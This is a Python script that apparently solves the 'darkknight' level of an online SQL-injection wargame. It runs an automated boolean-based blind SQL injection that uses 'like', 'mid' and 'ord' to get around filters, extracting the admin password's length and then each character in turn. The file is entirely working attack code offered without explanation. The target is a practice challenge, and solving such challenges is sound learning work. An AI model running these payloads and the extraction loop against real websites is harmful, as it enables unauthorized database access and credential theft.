import requests
import string

header = {"Cookie": "PHPSESSID=u6bvjf19ukrurufkh4r5ojgsmi;"}
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
string_data = string.digits + string.ascii_letters

print(string_data)

password = ""
password_len = 1

# find password length
while True:
    data = "?no=1 or id like \"admin\" %26%26 length(pw) like {}%23".format(str(password_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(password_len))
    password_len += 1
print("[+] Get Password Length : " + str(password_len))

# find password
for idx in range(1, password_len + 1):
    for i in string_data:
        data = "?no=1 or id like \"admin\" %26%26 ord(mid(pw,{},1)) like {}%23".format(idx,ord(i))
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            password = password + i
            print("[*] Finding... : " + password)
            break
print("[+] Found Password : " + password)